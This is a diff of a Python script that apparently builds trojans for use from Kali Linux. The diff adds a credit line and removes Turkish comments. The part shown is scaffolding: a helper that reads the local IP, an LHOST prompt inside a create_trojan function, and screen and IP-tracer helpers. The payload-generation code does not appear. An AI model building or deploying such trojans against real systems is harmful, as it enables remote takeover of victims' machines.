@@ -1,6 +1,7 @@
 # Credits
 # Creator : No_Name.exe
 # Zusy
+# Kali Linux
 
 from subprocess import run, PIPE
 import os
@@ -12,7 +13,6 @@ from subprocess import run, PIPE
 import os
 
 def get_kali_ip():
-    # Kali Linux'un IP adresini almak için ifconfig komutunu kullanın
     process = run("ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n 1", shell=True, stdout=PIPE, text=True)
     if process.returncode == 0:
         return process.stdout.strip()
@@ -45,7 +45,7 @@ def create_trojan():
     
     clear_screen()
     lhost = input("LHOST = ")
-    if not lhost:  # Eğer kullanıcı boş bir giriş yaparsa, Kali Linux'un IP adresini al
+    if not lhost: 
         lhost = get_kali_ip()
         if not lhost:
             print("Failed to get Kali Linux IP address.")
@@ -77,7 +77,7 @@ def create_trojan():
 import subprocess
 
 def clear_screen():
-    # Ekranı temizlemek için uygun bir komut kullanın
+
     subprocess.run("clear", shell=True)
 
 def ip_tracer():
